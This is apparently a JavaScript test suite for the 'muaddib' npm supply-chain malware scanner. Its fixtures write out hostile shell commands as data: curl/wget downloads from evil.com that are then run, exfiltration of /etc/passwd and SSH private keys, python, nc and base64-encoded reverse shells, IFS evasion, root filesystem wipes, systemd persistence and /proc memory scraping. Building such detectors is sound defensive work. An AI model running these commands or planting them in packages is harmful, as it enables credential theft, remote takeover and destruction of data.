const fs = require('fs');
const os = require('os');
const path = require('path');
const { test, asyncTest, assert, assertIncludes, runScan, runScanDirect, runScanFast, cleanupTemp, TESTS_DIR } = require('../test-utils');

function makeTempPkg(content, fileName = 'package.json') {
  const tmp = fs.mkdtempSync(path.join(os.tmpdir(), 'muaddib-shell-'));
  const pkg = {
    name: 'test-shell',
    version: '1.0.0',
    scripts: {}
  };
  if (fileName === 'package.json') {
    const parsed = typeof content === 'string' ? { scripts: { preinstall: content } } : content;
    Object.assign(pkg, parsed);
    fs.writeFileSync(path.join(tmp, 'package.json'), JSON.stringify(pkg));
  } else {
    fs.writeFileSync(path.join(tmp, 'package.json'), JSON.stringify(pkg));
    fs.writeFileSync(path.join(tmp, fileName), content);
  }
  return tmp;
}

async function runShellTests() {
  console.log('\n=== SHELL TESTS ===\n');

  await asyncTest('SHELL: Detects curl | sh (fast)', async () => {
    const output = await runScanFast(path.join(TESTS_DIR, 'shell'));
    assertIncludes(output, 'curl', 'Should detect curl | sh');
  });

  await asyncTest('SHELL: Detects wget && chmod +x (fast)', async () => {
    const output = await runScanFast(path.join(TESTS_DIR, 'shell'));
    assertIncludes(output, 'wget', 'Should detect wget');
  });

  await asyncTest('SHELL: Detects reverse shell (fast)', async () => {
    const output = await runScanFast(path.join(TESTS_DIR, 'shell'));
    assertIncludes(output, 'reverse', 'Should detect reverse shell');
  });

  await asyncTest('SHELL: Detects rm -rf $HOME (fast)', async () => {
    const output = await runScanFast(path.join(TESTS_DIR, 'shell'));
    assertIncludes(output, 'home', 'Should detect home deletion');
  });

  // --- v2.5.13: Expanded shell detection tests ---

  await asyncTest('SHELL: Detects two-stage wget + exec in preinstall', async () => {
    const tmp = makeTempPkg({ scripts: { preinstall: 'wget http://evil.com/payload -O /tmp/p && chmod +x /tmp/p && /tmp/p' } });
    try {
      const result = await runScanDirect(tmp);
      const t = result.threats.find(t => t.type === 'lifecycle_script' || t.type === 'lifecycle_shell_pipe');
      assert(t, 'Should detect lifecycle script with wget + chmod + exec');
    } finally { cleanupTemp(tmp); }
  });

  await asyncTest('SHELL: Detects curl POST exfiltration in postinstall', async () => {
    const tmp = makeTempPkg({ scripts: { postinstall: 'curl -X POST -d @/etc/passwd http://evil.com/exfil' } });
    try {
      const result = await runScanDirect(tmp);
      const t = result.threats.find(t => t.type === 'lifecycle_script' || t.type === 'lifecycle_shell_pipe');
      assert(t, 'Should detect lifecycle script with curl POST exfiltration');
    } finally { cleanupTemp(tmp); }
  });

  await asyncTest('SHELL: Detects base64 pipe to bash', async () => {
    const tmp = makeTempPkg({ scripts: { preinstall: 'echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4wLjAuMS80NDMgMD4mMQ== | base64 -d | bash' } });
    try {
      const result = await runScanDirect(tmp);
      const t = result.threats.find(t => t.message && (t.message.includes('base64') || t.message.includes('bash') || t.message.includes('pipe')));
      assert(t, 'Should detect base64 decode piped to bash');
    } finally { cleanupTemp(tmp); }
  });

  await asyncTest('SHELL: Detects python reverse shell in preinstall', async () => {
    const tmp = makeTempPkg({ scripts: { preinstall: 'python -c "import socket,subprocess;s=socket.socket();s.connect((\'10.0.0.1\',4444));subprocess.call([\'/bin/sh\',\'-i\'],stdin=s.fileno(),stdout=s.fileno())"' } });
    try {
      const result = await runScanDirect(tmp);
      const t = result.threats.find(t => t.type === 'lifecycle_script' || t.type === 'lifecycle_shell_pipe');
      assert(t, 'Should detect lifecycle script with python reverse shell');
    } finally { cleanupTemp(tmp); }
  });

  await asyncTest('SHELL: Detects SSH key exfiltration', async () => {
    const tmp = makeTempPkg({ scripts: { postinstall: 'curl -F "file=@$HOME/.ssh/id_rsa" http://evil.com/upload' } });
    try {
      const result = await runScanDirect(tmp);
      const t = result.threats.find(t => t.type === 'lifecycle_script' || t.type === 'lifecycle_shell_pipe');
      assert(t, 'Should detect lifecycle script with SSH key exfiltration');
    } finally { cleanupTemp(tmp); }
  });

  await asyncTest('SHELL: Safe npm script (no pipe, no evil) → no shell threat', async () => {
    const tmp = makeTempPkg({ scripts: { build: 'tsc && node build.js', test: 'jest --coverage' } });
    try {
      const result = await runScanDirect(tmp);
      const shellThreats = (result.threats || []).filter(t =>
        t.type === 'lifecycle_shell_pipe' || t.type === 'reverse_shell'
      );
      assert(shellThreats.length === 0, 'Safe npm scripts should not trigger shell threats');
    } finally { cleanupTemp(tmp); }
  });

  await asyncTest('SHELL: curl without pipe in postinstall → not lifecycle_shell_pipe', async () => {
    const tmp = makeTempPkg({ scripts: { postinstall: 'curl http://example.com/api/status' } });
    try {
      const result = await runScanDirect(tmp);
      const t = result.threats.find(t => t.type === 'lifecycle_shell_pipe');
      assert(!t, 'curl without pipe should NOT be lifecycle_shell_pipe');
    } finally { cleanupTemp(tmp); }
  });

  await asyncTest('SHELL: Detects env var wrapper for curl|sh', async () => {
    const tmp = makeTempPkg({ scripts: { preinstall: 'CMD="curl http://evil.com/s.sh | sh" && eval $CMD' } });
    try {
      const result = await runScanDirect(tmp);
      const t = result.threats.find(t => t.message && (t.message.includes('curl') || t.message.includes('eval')));
      assert(t, 'Should detect env var wrapped curl|sh');
    } finally { cleanupTemp(tmp); }
  });

  // =============================================
  // v2.5.14: B14/B15 — New shell patterns
  // =============================================

  await asyncTest('SHELL B14: mkfifo + nc reverse shell — detected', async () => {
    const tmp = fs.mkdtempSync(path.join(os.tmpdir(), 'muaddib-shell-'));
    fs.writeFileSync(path.join(tmp, 'package.json'), JSON.stringify({ name: 'test-shell', version: '1.0.0' }));
    fs.writeFileSync(path.join(tmp, 'exploit.sh'), 'mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 10.0.0.1 4444 > /tmp/f');
    try {
      const result = await runScanDirect(tmp);
      const t = (result.threats || []).find(t => t.type === 'fifo_nc_reverse_shell');
      assert(t, 'mkfifo + nc pattern should be detected as fifo_nc_reverse_shell');
    } finally { cleanupTemp(tmp); }
  });

  await asyncTest('SHELL B15: base64 -d | bash — detected', async () => {
    const tmp = fs.mkdtempSync(path.join(os.tmpdir(), 'muaddib-shell-'));
    fs.writeFileSync(path.join(tmp, 'package.json'), JSON.stringify({ name: 'test-shell', version: '1.0.0' }));
    fs.writeFileSync(path.join(tmp, 'exploit.sh'), 'echo "Y3VybCBodHRwOi8vZXZpbC5jb20vcy5zaA==" | base64 -d | bash');
    try {
      const result = await runScanDirect(tmp);
      const t = (result.threats || []).find(t => t.type === 'base64_decode_exec');
      assert(t, 'base64 -d | bash should be detected as base64_decode_exec');
    } finally { cleanupTemp(tmp); }
  });

  await asyncTest('SHELL B15: wget + base64 -d two-stage — detected', async () => {
    const tmp = fs.mkdtempSync(path.join(os.tmpdir(), 'muaddib-shell-'));
    fs.writeFileSync(path.join(tmp, 'package.json'), JSON.stringify({ name: 'test-shell', version: '1.0.0' }));
    fs.writeFileSync(path.join(tmp, 'exploit.sh'), 'wget http://evil.com/payload.b64 -O /tmp/p.b64 && base64 -d /tmp/p.b64 > /tmp/p && chmod +x /tmp/p');
    try {
      const result = await runScanDirect(tmp);
      const t = (result.threats || []).find(t => t.type === 'wget_base64_decode');
      assert(t, 'wget + base64 -d should be detected as wget_base64_decode');
    } finally { cleanupTemp(tmp); }
  });

  await asyncTest('SHELL B15 negative: base64 -d without pipe to bash — NOT detected', async () => {
    const tmp = fs.mkdtempSync(path.join(os.tmpdir(), 'muaddib-shell-'));
    fs.writeFileSync(path.join(tmp, 'package.json'), JSON.stringify({ name: 'test-shell', version: '1.0.0' }));
    fs.writeFileSync(path.join(tmp, 'safe.sh'), 'base64 -d cert.pem.b64 > cert.pem');
    try {
      const result = await runScanDirect(tmp);
      const t = (result.threats || []).find(t => t.type === 'base64_decode_exec');
      assert(!t, 'base64 -d without pipe to bash should NOT be detected');
    } finally { cleanupTemp(tmp); }
  });

  // --- IFS evasion patterns (v2.6.9) ---

  await asyncTest('SHELL B16: curl$IFS evasion pipe to shell detected', async () => {
    const tmp = fs.mkdtempSync(path.join(os.tmpdir(), 'muaddib-shell-'));
    fs.writeFileSync(path.join(tmp, 'package.json'), JSON.stringify({ name: 'test-shell', version: '1.0.0' }));
    fs.writeFileSync(path.join(tmp, 'exploit.sh'), '#!/bin/bash\ncurl${IFS}https://evil.com/payload.sh|sh');
    try {
      const result = await runScanDirect(tmp);
      const t = (result.threats || []).find(t => t.type === 'curl_ifs_evasion');
      assert(t, 'curl$IFS pipe to shell should be detected');
    } finally { cleanupTemp(tmp); }
  });

  await asyncTest('SHELL B17: eval $(curl ...) detected', async () => {
    const tmp = fs.mkdtempSync(path.join(os.tmpdir(), 'muaddib-shell-'));
    fs.writeFileSync(path.join(tmp, 'package.json'), JSON.stringify({ name: 'test-shell', version: '1.0.0' }));
    fs.writeFileSync(path.join(tmp, 'exploit.sh'), '#!/bin/bash\neval $(curl -s https://evil.com/script)');
    try {
      const result = await runScanDirect(tmp);
      const t = (result.threats || []).find(t => t.type === 'eval_curl_subshell');
      assert(t, 'eval $(curl) should be detected');
    } finally { cleanupTemp(tmp); }
  });

  await asyncTest('SHELL B18: sh -c curl detected', async () => {
    const tmp = fs.mkdtempSync(path.join(os.tmpdir(), 'muaddib-shell-'));
    fs.writeFileSync(path.join(tmp, 'package.json'), JSON.stringify({ name: 'test-shell', version: '1.0.0' }));
    fs.writeFileSync(path.join(tmp, 'exploit.sh'), '#!/bin/bash\nsh -c \'curl https://evil.com/stage2 | bash\'');
    try {
      const result = await runScanDirect(tmp);
      const t = (result.threats || []).find(t => t.type === 'sh_c_curl_exec');
      assert(t, 'sh -c curl should be detected');
    } finally { cleanupTemp(tmp); }
  });

  await asyncTest('SHELL B16-18 negative: benign curl/eval/sh usage NOT detected', async () => {
    const tmp = fs.mkdtempSync(path.join(os.tmpdir(), 'muaddib-shell-'));
    fs.writeFileSync(path.join(tmp, 'package.json'), JSON.stringify({ name: 'test-shell', version: '1.0.0' }));
    fs.writeFileSync(path.join(tmp, 'safe.sh'), '#!/bin/bash\ncurl -o output.json https://api.example.com/data\neval "echo hello"\nsh -c \'echo test\'');
    try {
      const result = await runScanDirect(tmp);
      const ifsT = (result.threats || []).find(t => t.type === 'curl_ifs_evasion');
      const evalT = (result.threats || []).find(t => t.type === 'eval_curl_subshell');
      const shT = (result.threats || []).find(t => t.type === 'sh_c_curl_exec');
      assert(!ifsT, 'Benign curl should NOT trigger curl_ifs_evasion');
      assert(!evalT, 'Benign eval should NOT trigger eval_curl_subshell');
      assert(!shT, 'Benign sh -c should NOT trigger sh_c_curl_exec');
    } finally { cleanupTemp(tmp); }
  });
  // ===== Bun runtime evasion in shell scripts =====
  console.log('\n=== BUN RUNTIME EVASION (SHELL) TESTS ===\n');

  await asyncTest('SHELL: bun run in .sh file → bun_runtime_evasion', async () => {
    const tmp = fs.mkdtempSync(path.join(os.tmpdir(), 'muaddib-shell-'));
    fs.writeFileSync(path.join(tmp, 'package.json'), JSON.stringify({ name: 'test-shell', version: '1.0.0' }));
    fs.writeFileSync(path.join(tmp, 'setup.sh'), '#!/bin/bash\nbun run payload.js');
    try {
      const result = await runScanDirect(tmp);
      const t = (result.threats || []).find(t => t.type === 'bun_runtime_evasion');
      assert(t, 'bun run in .sh should be detected');
      assert(t.severity === 'HIGH', `Expected HIGH, got ${t.severity}`);
    } finally { cleanupTemp(tmp); }
  });

  await asyncTest('SHELL: benign shell script without bun → NO bun_runtime_evasion', async () => {
    const tmp = fs.mkdtempSync(path.join(os.tmpdir(), 'muaddib-shell-'));
    fs.writeFileSync(path.join(tmp, 'package.json'), JSON.stringify({ name: 'test-shell', version: '1.0.0' }));
    fs.writeFileSync(path.join(tmp, 'build.sh'), '#!/bin/bash\nnpm run build\necho "done"');
    try {
      const result = await runScanDirect(tmp);
      const t = (result.threats || []).find(t => t.type === 'bun_runtime_evasion');
      assert(!t, 'Normal shell script should NOT trigger bun_runtime_evasion');
    } finally { cleanupTemp(tmp); }
  });

  await asyncTest('SHELL: bun run in shebang file (no extension) → bun_runtime_evasion', async () => {
    const tmp = fs.mkdtempSync(path.join(os.tmpdir(), 'muaddib-shell-'));
    fs.writeFileSync(path.join(tmp, 'package.json'), JSON.stringify({ name: 'test-shell', version: '1.0.0' }));
    fs.writeFileSync(path.join(tmp, 'bootstrap'), '#!/bin/bash\nbun run install_payload.js');
    try {
      const result = await runScanDirect(tmp);
      const t = (result.threats || []).find(t => t.type === 'bun_runtime_evasion');
      assert(t, 'bun run in shebang file should be detected');
    } finally { cleanupTemp(tmp); }
  });

  // --- v2.10.7: Python time.sleep sandbox evasion (SHELL-019) ---

  await asyncTest('SHELL-019: python3 -c time.sleep(300) in .sh → python_time_delay_exec', async () => {
    const tmp = fs.mkdtempSync(path.join(os.tmpdir(), 'muaddib-shell-'));
    fs.writeFileSync(path.join(tmp, 'package.json'), JSON.stringify({ name: 'test-shell', version: '1.0.0' }));
    fs.writeFileSync(path.join(tmp, 'deploy.sh'), '#!/bin/bash\npython3 -c "import time; time.sleep(300); import os; os.system(\'curl http://c2.evil.com\')"');
    try {
      const result = await runScanDirect(tmp);
      const t = (result.threats || []).find(t => t.type === 'python_time_delay_exec');
      assert(t, 'python3 -c with time.sleep(300) should be detected');
      assert(t.severity === 'HIGH', `Expected HIGH, got ${t.severity}`);
    } finally { cleanupTemp(tmp); }
  });

  await asyncTest('SHELL-019: python -c time.sleep(600) in .sh file → python_time_delay_exec', async () => {
    const tmp = fs.mkdtempSync(path.join(os.tmpdir(), 'muaddib-shell-'));
    fs.writeFileSync(path.join(tmp, 'package.json'), JSON.stringify({ name: 'test-shell', version: '1.0.0' }));
    fs.writeFileSync(path.join(tmp, 'setup.sh'), '#!/bin/bash\npython -c "import time; time.sleep(600)"');
    try {
      const result = await runScanDirect(tmp);
      const t = (result.threats || []).find(t => t.type === 'python_time_delay_exec');
      assert(t, 'python -c with time.sleep(600) in .sh should be detected');
    } finally { cleanupTemp(tmp); }
  });

  await asyncTest('SHELL-019: python3 time.sleep(5) in .sh → NOT detected (< 100s)', async () => {
    const tmp = fs.mkdtempSync(path.join(os.tmpdir(), 'muaddib-shell-'));
    fs.writeFileSync(path.join(tmp, 'package.json'), JSON.stringify({ name: 'test-shell', version: '1.0.0' }));
    fs.writeFileSync(path.join(tmp, 'run.sh'), '#!/bin/bash\npython3 -c "import time; time.sleep(5)"');
    try {
      const result = await runScanDirect(tmp);
      const t = (result.threats || []).find(t => t.type === 'python_time_delay_exec');
      assert(!t, 'time.sleep(5) should NOT trigger python_time_delay_exec (< 100s)');
    } finally { cleanupTemp(tmp); }
  });

  await asyncTest('SHELL-019: python3 time.sleep(99) in .sh → NOT detected (< 100s)', async () => {
    const tmp = fs.mkdtempSync(path.join(os.tmpdir(), 'muaddib-shell-'));
    fs.writeFileSync(path.join(tmp, 'package.json'), JSON.stringify({ name: 'test-shell', version: '1.0.0' }));
    fs.writeFileSync(path.join(tmp, 'check.sh'), '#!/bin/bash\npython3 -c "import time; time.sleep(99)"');
    try {
      const result = await runScanDirect(tmp);
      const t = (result.threats || []).find(t => t.type === 'python_time_delay_exec');
      assert(!t, 'time.sleep(99) should NOT trigger python_time_delay_exec (< 100s)');
    } finally { cleanupTemp(tmp); }
  });

  await asyncTest('SHELL-019: python3 time.sleep(100) in .sh → detected (exactly 100s)', async () => {
    const tmp = fs.mkdtempSync(path.join(os.tmpdir(), 'muaddib-shell-'));
    fs.writeFileSync(path.join(tmp, 'package.json'), JSON.stringify({ name: 'test-shell', version: '1.0.0' }));
    fs.writeFileSync(path.join(tmp, 'init.sh'), '#!/bin/bash\npython3 -c "import time; time.sleep(100)"');
    try {
      const result = await runScanDirect(tmp);
      const t = (result.threats || []).find(t => t.type === 'python_time_delay_exec');
      assert(t, 'time.sleep(100) should trigger python_time_delay_exec (>= 100s)');
    } finally { cleanupTemp(tmp); }
  });

  await asyncTest('SHELL-019: rule and playbook exist for python_time_delay_exec', async () => {
    const { getRule } = require('../../src/rules/index.js');
    const { getPlaybook } = require('../../src/response/playbooks.js');
    const rule = getRule('python_time_delay_exec');
    assert(rule.id === 'MUADDIB-SHELL-019', `Expected MUADDIB-SHELL-019, got ${rule.id}`);
    assert(rule.mitre === 'T1497.003', `Expected T1497.003, got ${rule.mitre}`);
    const playbook = getPlaybook('python_time_delay_exec');
    assert(playbook.includes('T1497.003'), 'Playbook should reference T1497.003');
  });

  // --- v2.10.11: TeamPCP/CanisterWorm patterns (SHELL-020, SHELL-021) ---

  await asyncTest('SHELL-020: rm -rf / --no-preserve-root → root_filesystem_wipe', async () => {
    const tmp = fs.mkdtempSync(path.join(os.tmpdir(), 'muaddib-shell-'));
    fs.writeFileSync(path.join(tmp, 'package.json'), JSON.stringify({ name: 'test-shell', version: '1.0.0' }));
    fs.writeFileSync(path.join(tmp, 'wiper.sh'), '#!/bin/bash\nrm -rf / --no-preserve-root');
    try {
      const result = await runScanDirect(tmp);
      const t = (result.threats || []).find(t => t.type === 'root_filesystem_wipe');
      assert(t, 'rm -rf / --no-preserve-root should be detected as root_filesystem_wipe');
      assert(t.severity === 'CRITICAL', `Expected CRITICAL, got ${t.severity}`);
    } finally { cleanupTemp(tmp); }
  });

  await asyncTest('SHELL-020: rm -rf / (bare) → root_filesystem_wipe', async () => {
    const tmp = fs.mkdtempSync(path.join(os.tmpdir(), 'muaddib-shell-'));
    fs.writeFileSync(path.join(tmp, 'package.json'), JSON.stringify({ name: 'test-shell', version: '1.0.0' }));
    fs.writeFileSync(path.join(tmp, 'destroy.sh'), '#!/bin/bash\nrm -rf / ;echo done');
    try {
      const result = await runScanDirect(tmp);
      const t = (result.threats || []).find(t => t.type === 'root_filesystem_wipe');
      assert(t, 'rm -rf / should be detected as root_filesystem_wipe');
    } finally { cleanupTemp(tmp); }
  });

  await asyncTest('SHELL-020: rm -rf /home NOT detected as root_filesystem_wipe (covered by home_deletion)', async () => {
    const tmp = fs.mkdtempSync(path.join(os.tmpdir(), 'muaddib-shell-'));
    fs.writeFileSync(path.join(tmp, 'package.json'), JSON.stringify({ name: 'test-shell', version: '1.0.0' }));
    fs.writeFileSync(path.join(tmp, 'clean.sh'), '#!/bin/bash\nrm -rf /home/user');
    try {
      const result = await runScanDirect(tmp);
      const t = (result.threats || []).find(t => t.type === 'root_filesystem_wipe');
      assert(!t, 'rm -rf /home should NOT trigger root_filesystem_wipe (it triggers home_deletion)');
    } finally { cleanupTemp(tmp); }
  });

  await asyncTest('SHELL-021: systemctl enable → systemd_persistence', async () => {
    const tmp = fs.mkdtempSync(path.join(os.tmpdir(), 'muaddib-shell-'));
    fs.writeFileSync(path.join(tmp, 'package.json'), JSON.stringify({ name: 'test-shell', version: '1.0.0' }));
    fs.writeFileSync(path.join(tmp, 'install.sh'), '#!/bin/bash\nsystemctl --user enable pgmon');
    try {
      const result = await runScanDirect(tmp);
      const t = (result.threats || []).find(t => t.type === 'systemd_persistence');
      assert(t, 'systemctl enable should be detected as systemd_persistence');
      assert(t.severity === 'CRITICAL', `Expected CRITICAL, got ${t.severity}`);
    } finally { cleanupTemp(tmp); }
  });

  await asyncTest('SHELL-021: systemctl daemon-reload → systemd_persistence', async () => {
    const tmp = fs.mkdtempSync(path.join(os.tmpdir(), 'muaddib-shell-'));
    fs.writeFileSync(path.join(tmp, 'package.json'), JSON.stringify({ name: 'test-shell', version: '1.0.0' }));
    fs.writeFileSync(path.join(tmp, 'setup.sh'), '#!/bin/bash\nsystemctl daemon-reload');
    try {
      const result = await runScanDirect(tmp);
      const t = (result.threats || []).find(t => t.type === 'systemd_persistence');
      assert(t, 'systemctl daemon-reload should be detected as systemd_persistence');
    } finally { cleanupTemp(tmp); }
  });

  await asyncTest('SHELL-022: /proc/pid/mem access → proc_mem_scan', async () => {
    const tmp = fs.mkdtempSync(path.join(os.tmpdir(), 'muaddib-shell-'));
    fs.writeFileSync(path.join(tmp, 'package.json'), JSON.stringify({ name: 'test-shell', version: '1.0.0' }));
    fs.writeFileSync(path.join(tmp, 'steal.sh'), '#!/bin/bash\ncat /proc/1234/mem | grep -a isSecret');
    try {
      const result = await runScanDirect(tmp);
      const t = (result.threats || []).find(t => t.type === 'proc_mem_scan');
      assert(t, '/proc/pid/mem access should be detected as proc_mem_scan');
      assert(t.severity === 'CRITICAL', `Expected CRITICAL, got ${t.severity}`);
    } finally { cleanupTemp(tmp); }
  });

  await asyncTest('SHELL-020/021/022: rules and playbooks exist', async () => {
    const { getRule } = require('../../src/rules/index.js');
    const { getPlaybook } = require('../../src/response/playbooks.js');

    const r1 = getRule('root_filesystem_wipe');
    assert(r1.id === 'MUADDIB-SHELL-020', `Expected MUADDIB-SHELL-020, got ${r1.id}`);
    const p1 = getPlaybook('root_filesystem_wipe');
    assert(p1.includes('rm -rf'), 'Playbook should reference rm -rf');

    const r2 = getRule('systemd_persistence');
    assert(r2.id === 'MUADDIB-AST-059', `Expected MUADDIB-AST-059, got ${r2.id}`);
    const p2 = getPlaybook('systemd_persistence');
    assert(p2.includes('systemd') || p2.includes('pgmon'), 'Playbook should reference systemd or pgmon');

    const r3 = getRule('proc_mem_scan');
    assert(r3.id === 'MUADDIB-SHELL-021', `Expected MUADDIB-SHELL-021, got ${r3.id}`);
    const p3 = getPlaybook('proc_mem_scan');
    assert(p3.includes('proc') || p3.includes('/mem'), 'Playbook should reference proc or mem');

    const r4 = getRule('npm_token_steal');
    assert(r4.id === 'MUADDIB-AST-060', `Expected MUADDIB-AST-060, got ${r4.id}`);
    const p4 = getPlaybook('npm_token_steal');
    assert(p4.includes('npm') || p4.includes('token'), 'Playbook should reference npm or token');
  });
}

module.exports = { runShellTests };
